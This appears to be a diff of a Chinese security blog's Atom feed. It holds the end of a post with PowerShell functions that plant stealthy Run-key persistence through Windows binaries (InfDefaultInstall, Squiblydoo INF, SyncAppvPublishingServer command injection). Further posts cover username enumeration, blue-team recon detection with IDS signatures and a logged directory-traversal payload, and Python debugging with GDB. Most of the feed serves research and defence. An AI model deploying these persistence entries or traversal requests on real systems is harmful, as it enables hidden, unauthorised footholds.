+	# TODO: param for registry key name
+	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+	$infpath = $Path
+	$infdefaultinstall = &quot;INF Default Install&quot;
+	$ComScriptlet = '&quot;C:\Windows\system32\infdefaultinstall.exe ' + $infpath + '&quot;'
+
+	Set-ItemProperty -Path $Autoruns -Name $infdefaultinstall -Value $ComScriptlet -Type ExpandString
+}
+
+function UninstallAutoRuns-INFDefaultInstall
+{
+	param
+		(
+			[Parameter(Mandatory = $True)]
+			[string]$Path
+		)
+
+	# TODO: param for registry key name
+	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+	$infpath = $Path
+	$infdefaultinstall = &quot;INF Default Install&quot;
+
+	Remove-ItemProperty -Path $Autoruns -Name $infdefaultinstall
+}
+
+function InstallAutoRuns-SquiblydooINF
+{
+	param
+		(
+			[Parameter(Mandatory = $True)]
+			[string]$Path
+		)
+	# Example inf here: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf
+	# TODO: Generate inf file
+	# TODO: param for registry key name
+	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+	$infpath = $Path
+	$infdefaultinstall = &quot;Squiblydoo&quot;
+	$ComScriptlet = '&quot;C:\Windows\system32\rundll32.exe setupapi,InstallHinfSection ModelsSection 128 ' + $infpath + '&quot;'
+
+	Set-ItemProperty -Path $Autoruns -Name $infdefaultinstall -Value $ComScriptlet -Type ExpandString
+}
+
+function UninstallAutoRuns-SquiblydooINF
+{
+	param
+		(
+			[Parameter(Mandatory = $True)]
+			[string]$Path
+		)
+
+	# TODO: param for registry key name
+	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+	$infpath = $Path
+	$infdefaultinstall = &quot;Squiblydoo&quot;
+
+	Remove-ItemProperty -Path $Autoruns -Name $infdefaultinstall
+}
+
+function InstallAutoRuns-SyncAppvPublishing
+{
+	param
+		(
+			[Parameter(Mandatory = $True)]
+			[string]$Cmd
+		)
+	$SyncAppvPublishing = '&quot;C:\Windows\system32\SyncAppvPublishingServer.exe&quot;.; ' + $Cmd + '&quot;&quot;'
+	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+
+	Set-ItemProperty -Path $Autoruns -Name &quot;SyncAppvPublishing&quot; -Value $SyncAppvPublishing -Type ExpandString
+
+}
+
+function UninstallAutoRuns-SyncAppvPublishing
+{
+	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+	Remove-ItemProperty -Path $Autoruns -Name &quot;SyncAppvPublishing&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;學習總結&quot;&gt;&lt;strong&gt;學習總結&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;我需要花更多的時間學習和撰寫PowerShell。這個腳本效率很差，它應可更加動態。另外，做研究的人並不總是可以回答問題的答案，所以我在12天前通過Twitter DM聯繫了Kyle，詢問有關“InfDefaultInstall.exe”和“Squiblydoo INF”持久性技術的問題，但他至今未回OAQ。
+你所能做的最好防禦是充分理解此研究並將其應用到實務中。記錄你的探索旅程也很有幫助，我希望有人比我更聰明，可以填補這裡的技術空白。
+&lt;img src=&quot;https://i.imgur.com/AdAagPV.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;來源                                                                                                                                                    &lt;br /&gt;
+&lt;a href=&quot;https://twitter.com/chrisbisnett&quot;&gt;Chris Bisnett (@chrisbisnett)&lt;/a&gt;                  &lt;br /&gt;
+&lt;a href=&quot;https://twitter.com/KyleHanslovan&quot;&gt;Kyle Hanslovan (@KyleHanslovan)&lt;/a&gt;&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="exploit" /><category term="vulnerability" /><summary type="html">by lopi 2017年10月25日發布</summary></entry><entry><title type="html">使用者名稱或密碼錯誤根本是鬼扯</title><link href="https://security-onigiri.github.io//2018/01/21/username-or-password-is-incorrect-is-bullshit.html" rel="alternate" type="text/html" title="使用者名稱或密碼錯誤根本是鬼扯" /><published>2018-01-21T00:00:00-08:00</published><updated>2018-01-21T00:00:00-08:00</updated><id>https://security-onigiri.github.io//2018/01/21/username%20or%20password%20is%20incorrect%20is%20bullshit</id><content type="html" xml:base="https://security-onigiri.github.io//2018/01/21/username-or-password-is-incorrect-is-bullshit.html">&lt;h1 id=&quot;username-or-password-is-incorrect-is-bullshit&quot;&gt;username or password is incorrect is bullshit&lt;/h1&gt;
+
+&lt;p&gt;There’s a security best practice where sign ins aren’t supposed to say “password is incorrect”. Instead they’re supposed to say the “username or password is incorrect”. This “best practice” is bullshit.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;有一個資安最佳實踐表示登入不該回應 “密碼錯誤” 而是應該回應 “使用者名稱或密碼錯誤” 這個”最佳實踐”根本鬼扯。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Strip and GitHub’s sign ins for example follow this practice.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Strip 與 Github 的登入遵守了這個實踐如下所示&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/1000/1*hisYwzk7kIhUdfxZ9vwBBA.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/1000/1*Nie0O5MurE_fvTuKbYkXzw.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The idea is if an attacker knows a username, he or she could concentrate on that account using SQL injection, brute forcing the password, phishing, and so on.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;用意為當一個攻擊者知道一個使用者名稱，他或她可以專注在這個讓帳戶之上，使用如資料隱碼攻擊、暴力嘗試密碼、釣魚等攻擊。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Here’s the problem.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;問題在這。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/1000/1*k9s51jl1KGEx59iyiojYPg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/1000/1*XjOkBwmPXh613-nldQlSYQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All a hacker has to do is sign up to know whether the username is valid or not. Why bother then with obfuscating the sign in ? Only the dumbest, laziest hacker is stopped by the “username or password is incorrect” sign in. You gain no security, yet your customers lose clarity.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;一個攻擊者需要做的就只有註冊，便可以知道這個使用者名稱是否為有效的。為什麼模稜兩可的登入可以擾煩到他們呢 ? 只有最笨、最懶的駭客會被”使用者名稱或密碼錯誤”登入給阻止。你並不會從中得到任何的安全，而是客戶們失去了清晰度。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Stipe has their form submission behind reCAPTCHA to prevent naive scripts attacking their sign up. However this has been broken multiple times (1, 2) and likely won’t ever be perfect. Even if reCATCHA was perfect, a hacker could manually validate their usernames of interest by trying to sign up, then automate an attack on the sign in page.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Strip 的表單提交背後有 reCAPTCHA 來避免天真的腳本攻擊他們的註冊功能。然而這已經被玩壞好多次了(&lt;a href=&quot;https://www.blackhat.com/docs/asia-16/materials/asia-16-Sivakorn-Im-Not-a-Human-Breaking-the-Google-reCAPTCHA-wp.pdf&quot;&gt;1&lt;/a&gt;, &lt;a href=&quot;https://github.com/eastee/rebreakcaptcha&quot;&gt;2&lt;/a&gt;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;To prevent attackers from knowing whether an account exists or not your signup must only take an email address and provide no feedback in the UI if the sign up succeeded or not. Instead the user would receive an email saying they’re signed up. The only way an attacker would know if an account exists is if they had access to the target’s email.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;為了避免攻擊者們得知一個帳戶是否存在，你的註冊必須只透過一個 email 地址而且在 UI 中不提供任何反饋，無論成功與否。取而代之的是使用者將收到一封 email 表示他們已經註冊。攻擊者唯一會知道帳戶存在的方法就是，他們已經可以存取目標的 email。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Barring that, “username or password incorrect” is just bullshit.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;喔還有，”使用者名稱或是密碼錯誤”根本狗屎爛蛋。&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="Web" /><summary type="html">username or password is incorrect is bullshit</summary></entry><entry><title type="html">Blue Team：檢測偵察活動</title><link href="https://security-onigiri.github.io//2017/11/18/recon-detection.html" rel="alternate" type="text/html" title="Blue Team：檢測偵察活動" /><published>2017-11-18T00:00:00-08:00</published><updated>2017-11-18T00:00:00-08:00</updated><id>https://security-onigiri.github.io//2017/11/18/recon-detection</id><content type="html" xml:base="https://security-onigiri.github.io//2017/11/18/recon-detection.html">&lt;h1 id=&quot;blue-team檢測偵察活動&quot;&gt;&lt;strong&gt;Blue Team：檢測偵察活動&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;附註：本文最初出現在 CrowdStrike 部落格上。&lt;/p&gt;
+
+&lt;p&gt;少數blue team會願意花費時間在檢測偵察活動這件事上。網路受到近乎連續掃描的流量衝擊，然後在其中分辨可疑目標活動與網路雜訊可能非常困難。但是，在攻擊的早期階段，您仍然可以採取一些措施來對抗偵察活動。&lt;/p&gt;
+
+&lt;h2 id=&quot;最好的偵查方式是自己做偵查&quot;&gt;最好的偵查方式是自己做偵查&lt;/h2&gt;
+&lt;p&gt;我們都知道偵察活動是無所不在的，而最好的防守就是藉由掃描您自己的網路來在這場攻防遊戲中保持領先。規劃定期的資產識別和漏洞掃描，並以最優先級考慮漏洞更新。如果您團隊中的某人正在定期測試關鍵網頁應用程序中的 SQL injection 漏洞，那您則不必在某個周末花費時間來修復新的 sqlmap pwnage。同樣的預先籌備行動可以幫助緩解主動和被動的偵察活動帶來的壓力。我們的團隊經常幫助客戶進行開源數據收集，藉以識別公司或員工資產是否有不必要的訊息洩漏。這本該是 red team 應該做的─幫助組織預見攻擊並限制其攻擊面。&lt;/p&gt;
+
+&lt;h2 id=&quot;檢測---深入查看&quot;&gt;檢測 - 深入查看&lt;/h2&gt;
+&lt;p&gt;掃描偵查活動通常不難自己檢測。例如，以下的Log難道像是正常Googlebot的活動？&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/OxFusYv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;圖1：在部落格中所見的 Nikto 的掃描內容&lt;/p&gt;
+
+&lt;p&gt;我們甚至可以通過頻率分析來識別並迴避探測，例如監視每個 IP 地址的故障次數或堆疊用戶代理字串，藉以發現異常。偵查對手在偽造用戶代理中出現錯誤或者無法更改掃描儀提供的默認值的數量是極其驚人的。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
+mozilla/5.0(compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)
+Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:2.2.0.3) Gecko/20100101 Firefox/37.0
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0
+Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
+Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;圖2：用戶的堆疊分析。你可以發現異常值嗎？&lt;/p&gt;
+
+&lt;p&gt;雖然這看起來很簡單容易，但導致檢測無效的其實是當您面向網路服務器的巨量的偵察活動，會有杯水車薪之感。所以相反的，應該將您的努力集中在您的內部網絡上。許多組織都過度資源傾斜在防衛面向公網路的資源層面，但內部伺服器卻在很大程度上被忽視。這是極其危險的，因為攻擊者一旦在內部網路中獲取立足之地，他們通常會掃描內部網頁應用程序來幫助轉發，藉以提升權限並收集敏感數據。
+在檢查內部伺服器 Log 時，偵測活動檢測則更為可行。您應該可以看到企業中存在的設備的用戶代理字符串相對較小─因此查詢內部資源的 Googlebot 將非常可疑。特別是一旦過濾掉自己組織的內部漏洞掃描器活動，掃描偵查活動也應更易於識別。想像一下在內部應用伺服器 Log 中看到類似圖3的異常情況。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/H2DuQKz.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;圖3：識別Sqlmap掃描的Web日誌&lt;/p&gt;
+
+&lt;h2 id=&quot;自動檢測&quot;&gt;自動檢測&lt;/h2&gt;
+&lt;p&gt;通過對內部 Log 的間歇性手動審查，能自動檢測常見的偵察活動則更為理想。監控模式下的 Web 應用程序防火牆等工具可以可靠地檢測常見的偵察活動，如 SQL injection，當僅針對內部請求時，警報應更為準確。然而，也許最具有效的偵察能力是網路安全監控（NSM）。雖然它需要內部傳感器布署和可見性，但可以在整個攻擊週期中分配資源。一個針對“出色的新興威脅公開規則”快速總結則顯示了各種可用於在偵察階段檢測惡意行為的特徵。圖4中顯示了兩個例子。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;| alert tcp $EXTERNAL_NET any -&amp;gt; $HTTP_SERVERS $HTTP_PORTS (msg:”ET SCAN Possible SQLMAP Scan”; flow:established,to_server; content:” AND “; http_uri; content:”AND (“; http_uri; pcre:”/\x20AND\x20[0-9]{6}\x3D[0-9]{4}/U”; detection_filter:track by_dst, count 4, seconds 20; reference:url,sqlmap.sourceforge.net; reference:url,www.darknet.org.uk/2011/04/sqlmap-0-9-released-automatic-blind-sql-injection-tool/; classtype:attempted-recon; sid:2012755; rev:3;) alert http $EXTERNAL_NET any -&amp;gt; $HTTP_SERVERS any (msg:”GPL EXPLOIT unicode directory traversal attempt”; flow:to_server,established; content:”/..%c1%9c../”; http_raw_uri; reference:bugtraq,1806; reference:cve,2000-0884; reference:nessus,10537; classtype:web-application-attack; sid:2100983; rev:19;) | 
+| -------- | 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;圖4：偵察活動的示例新興威脅簽名&lt;/p&gt;
+
+&lt;p&gt;一旦監控到位並且傳感器已被調整至最佳，NSM 警報就會像圖5中的那樣，可以很容易地進行偵察檢測。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;| {“timestamp”:”2016-02-10T09:50:04.005484+0000″,”flow_id”:140389013543568,”event_type”:”alert”, “src_ip”:”172.16.30.149″,”src_port”:56173,”dest_ip”:”172.16.10.70″,”dest_port”:80,”proto”:”TCP”,”alert”:{“action”:”allowed”,”gid”:1,”signature_id”:2100983,”rev”:19,”signature”:”GPL EXPLOIT unicode directory traversal attempt”,”category”:”Web Application Attack”,”severity”:1,”tx_id”:0}, “payload_printable”:”0mk………….GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.1\r\nHost: 172.16.10.70\r\nConnection: Keep-Alive\r\nQua”,”stream”:1} | 
+| -------- | 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;圖5：應用服務器掃描觸發的Suricata警報示例&lt;/p&gt;
+
+&lt;p&gt;另一個NSM選項越來越受歡迎則是 Bro IDS。Bro 的事件引擎和策略腳本給予非常好的異常檢測。更幸運的是，已經有腳本可用於在 SQL injection 之類的事件上進行警報，例如 detect-sqli.bro。為了使檢測成為可能，您將需要擴展您的工作並將警報導入分析工具。我們的團隊使用 Splunk，圖6顯示了用於分析的 Bro SQL injection 警報的集合。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/vB2K20C.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;圖6：Bro SQL注入警報導入Splunk&lt;/p&gt;
+
+&lt;h2 id=&quot;結論&quot;&gt;結論&lt;/h2&gt;
+
+&lt;p&gt;雖然在殺戮鏈 (kill chain）中有更多收益較高的機會可以進一步檢測攻擊者的活動，但我們認為檢測偵察活動不應該被忽視。偵察自己的網路，並由攻擊者觀點來獲得潛在弱點。網路結構本該規劃成可監控關鍵的內部網路和系統，並將偵查工作集中在那裡。從自我偵查開始，並以此持續優化您個人的高保真度特徵值。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="recon" /><summary type="html">Blue Team：檢測偵察活動</summary></entry><entry><title type="html">用 GDB 來除錯 Python</title><link href="https://security-onigiri.github.io//2017/11/17/jeff-mcneil-debugging-your-python-with-gdb-ftw.html" rel="alternate" type="text/html" title="用 GDB 來除錯 Python" /><published>2017-11-17T00:00:00-08:00</published><updated>2017-11-17T00:00:00-08:00</updated><id>https://security-onigiri.github.io//2017/11/17/jeff-mcneil-debugging-your-python-with-gdb-ftw</id><content type="html" xml:base="https://security-onigiri.github.io//2017/11/17/jeff-mcneil-debugging-your-python-with-gdb-ftw.html">&lt;h1 id=&quot;debugging-your-python-with-gdb-ftw&quot;&gt;Debugging Your Python With GDB (FTW!)&lt;/h1&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;編按：具體文章已遺失，透過網路找到 cache 文章來翻譯&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In this post we’ll take a look at how to debug your Python code using GDB. It is a handy thing to understand, especially if you’re confronted with an unexpected SEGV or other less than helpful error. I do realize there is some awesome pytohn-gdb.py integration with GDB. I purposefully ignored that.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;在這邊文章中我們將一起探究如何使用 GDB 來為 Python 程式碼除錯。這是一個手工活，特別是你遭遇過一個非預期的 SEGV(SegmentationFault) 或是沒有任何幫助的錯誤訊息。我理解有些像 python-gdb.py 等很讚的 GDB 整合工具，這裡故意忽略不探討之。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;As an unfortunate note, I started doing this using Python 3.3, but at some point, I switched 2.6 accidentally. I’ve migrated the earlier pieces to 2.6. If anyone smarter than I notices an inconsistency, this is why. I’m fairly certian I’ve cleaned it all up.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;作為一個不幸的紀錄，我剛開始是使用 Python 3.3，但是在某些點上我偶然間換到 2.6。我已經遷移早些的東西到 2.6。如果任何聰明過我的人有注意到矛盾處，這就是原因，我相當的確定已經都處理好了。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Finally, the GDB formatting is mine. I attempted to make it slightly more readable. Hope it helps.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;終於，GDB 格式是我的了。我傾向於讓它更具可讀性，希望這樣有幫助。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;how-does-python-evaluate-code---python-如何解釋程式碼-&quot;&gt;How Does Python Evaluate Code ? / Python 如何解釋程式碼 ？&lt;/h3&gt;
+
+&lt;p&gt;First, a little bit of background. Python implements a stack-based virtual machine. Python byte code manipulates that stack during normal execution. For example, let’s take a look at a small application disassembled into byte code:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;首先，來點背景知識。Python 實做一個基於堆疊的虛擬機 Python byte code 在執行時期操作該堆疊。例如，讓我們觀察一個反組譯成 byte code 的小程式:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is a fairly trivial example that should show us a good sampling of the “instruction set.” We’re going to skim over this bit as understanding all of the byte code operations really isn’t necessity here. When we use the dis module, we see that the following code is generated:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這是一個相當顯而易見的例子，應該可以很好的表達指令集的範例。在這裡詳細的了解 byte code 操作並不是很必須的，所以我們將忽略它。當我們使用 dis 模組，我們看到產生的程式碼如下:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1    0 LOAD_CONST    0(1)
+     3 STORE_NAME    0(a)
+
+2    6 LOAD_CONST    1(2)
+     9 STORE_NAME    1(b)
+
+3   12 LOAD_NAME     0(a)
+    15 LOAD_NAME     1(b)
+
+4   22 LOAD_NAME     2(c)
+    25 PRINT_ITEM
+    26 PRINT_NEWLINE
+    27 LOAD_CONST    2(None)
+    30 RETURN_VALUE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is fairly self explanatory. We see at position 1 that the constants 1 &amp;amp; 2 are placed into a &amp;amp; b. Next, they’re placed on the stack and BINARY_ADD is called, which triggers the addition of two number objects. Next, STORE_NAME saves the value of the add operation (from the top of the stack) to the location c. Finally, we load c and call the print operations. In Python 3, this would simply call the print function, via CALL_FUNCTION. For an overview of how Python generates bytecode from Python code, see Python/compile.c. The comment at the top of the file is quite helpful.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;相當不言自明的。我們看到位置 &lt;em&gt;1&lt;/em&gt; 常數 &lt;em&gt;1&lt;/em&gt; 與 &lt;em&gt;2&lt;/em&gt; 被放入 &lt;em&gt;a&lt;/em&gt; 與 &lt;em&gt;b&lt;/em&gt;。下一個，他們被放置在堆疊上，而觸發兩個數字物件相加的 BINARY_ADD 則被呼叫了，接下來 STORE_NAME 儲存了加法運算的值 (從堆疊的頂端) 到位置 &lt;em&gt;c&lt;/em&gt;. 最後，我們載入 &lt;em&gt;c&lt;/em&gt; 並且呼叫 print 操作。在 Python 3 將簡單透過 CALL_FUNCTION 呼叫 print 函式。為了要知道 Python 如何從 Python 程式碼產生 bytecode ，可以參照 Python/compile.c 。在該檔案頂端的註解非常的有幫助。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Using Python 2.6 as a reference point, all of this happens at Python/ceval.c. The function handling byte code execution is named PyEval_EvalFrameEx. Generally, this is a big switch statement. I use the term switch loosely as it is actually a collection of computed goto labels on both Mac OS and Linux (Visual Studio doesn’t allow that).&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;使用 Python 2.6 作為一個參考點，所有的這些流程都發生在 Python/ceval.c。處理執行 bytecode 的函式名為 &lt;em&gt;PyEval_EvalFrameEx&lt;/em&gt;。大致上，這是一個大型的 switch 陳述語句。在 Mac OS 與 Linux 上我使用 switch 這個詞泛指實際上是一個計算過後的 &lt;em&gt;goto&lt;/em&gt; 標籤集合 (在 Visual Studio 上不允許)。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Looking at this function, you’ll see various entries such as this;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;看這個函釋，你將看到各種類似這樣的進入點&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;case POP_TOP:
+    v = POP();
+    Py_DECREF(v);
+    goto fast_next_opcode;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is the implementation for the POP_TOP instuction. The POP macro returns the top value of the stack and the subsequent Py_DECREF(v) decrements the reference count. At this point, that could trigger execution of v-&amp;gt;ob_type-&amp;gt;tp_del &amp;amp; v-&amp;gt;ob_type-&amp;gt;tp_dealloc, if the reference count of v (v-&amp;gt;ob_refcnt) has reached zero. As an aside, note that Python checks for events/thread switches every sys.getcheckinterval() instuctions. If the corresponding implementation of an instruction is complex (and doesn’t release the GIL), we can be left waiting here.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這是 &lt;em&gt;POP_TOP&lt;/em&gt; 指令的實作。&lt;em&gt;POP&lt;/em&gt; 巨集返回堆疊頂端上的值，隨後的 &lt;em&gt;Py_DECREF(v)&lt;/em&gt; 減少參考計量。在此，如果 v (v-&amp;gt;ob_refcnt) 的參考計量為 &lt;em&gt;0&lt;/em&gt; 則會觸發 &lt;em&gt;v-&amp;gt;ob_type-&amp;gt;tp_del&lt;/em&gt; 與 &lt;em&gt;v-&amp;gt;ob_type-&amp;gt;tp_dealloc&lt;/em&gt; 的執行。另外，Python 會在每個 &lt;em&gt;sys.getcheckinterval()&lt;/em&gt; 指令檢查事件與執行緒的切換。我們將需要等待，如果對應的指令實作是複雜的 (而且不釋放 GIL)。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Now, we come to the function we’re interested in:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;現在來到我們的目標函式:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;PyObject * PyEvalCodeEx(PyObject *co, PyObject *globals, PyObject *locals, PyObject **args, int argcount, PyObject **kws, int kwcount, PyObject **defs, int defcount, PyObject *closure);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Essentially this fucntion builds a frame from the code object being executed and relies on PyEval_PyEvalFrameEx to handle bytecode instruction evaluation. The code object contains references to globals, locals, nested scopes (free vars/cell vars, depending on the angle), etc. PyEvalCodeEx “transforms” that into a PyFrameObject.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;本質上這個函式從被執行的程式碼物件建立一個 &lt;em&gt;frame&lt;/em&gt; 並依靠 &lt;em&gt;PyEval_PyEvalFrameEx&lt;/em&gt; 來處理 bytecode 指令的解釋。程式碼物件包含對 &lt;em&gt;globals&lt;/em&gt;、&lt;em&gt;locals&lt;/em&gt;、巢狀作用域(free vars/cell vars, 視角度而定) 等的參考。 &lt;em&gt;Py_EvalCodeEx&lt;/em&gt; 將之轉換成一個 PyFrameObject。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;It is this code object evalution function we’re interested in as functions and methods are generally boiled down to code objects.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我們感興趣的程式碼解釋物件作為函式與方法通常歸根究柢都是程式碼物件。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;python-data-structure-data-structures--python-資料結構資料結構&quot;&gt;Python Data Structure Data Structures / Python 資料結構資料結構&lt;/h3&gt;
+
+&lt;p&gt;Now that we’ve covered where to look, we need to take a look at what to look for. This means building a bit of an understanding around a few data structures.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我們已經過了要看哪裡的部分，我們需要看一下我們在尋找什麼。這代表建立一些資料結構的背景知識。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;type-objects--型態物件&quot;&gt;Type Objects / 型態物件&lt;/h4&gt;
+
+&lt;p&gt;All of Python’s classes (well, almost) are represented by PyTypeObject objects, which is defined in Python/Include/Object.h. This structure contains a whole lot of fields. Most of these fields will be pretty familiar looking as this is generally how “dunder”, or __methods__, are implemented. Standard, generic values are used(see PyType_Ready) if you don’t setup your own. This is a long structure, but including it here is relevant:&lt;/p&gt;
+
+&lt;blockquote&gt;
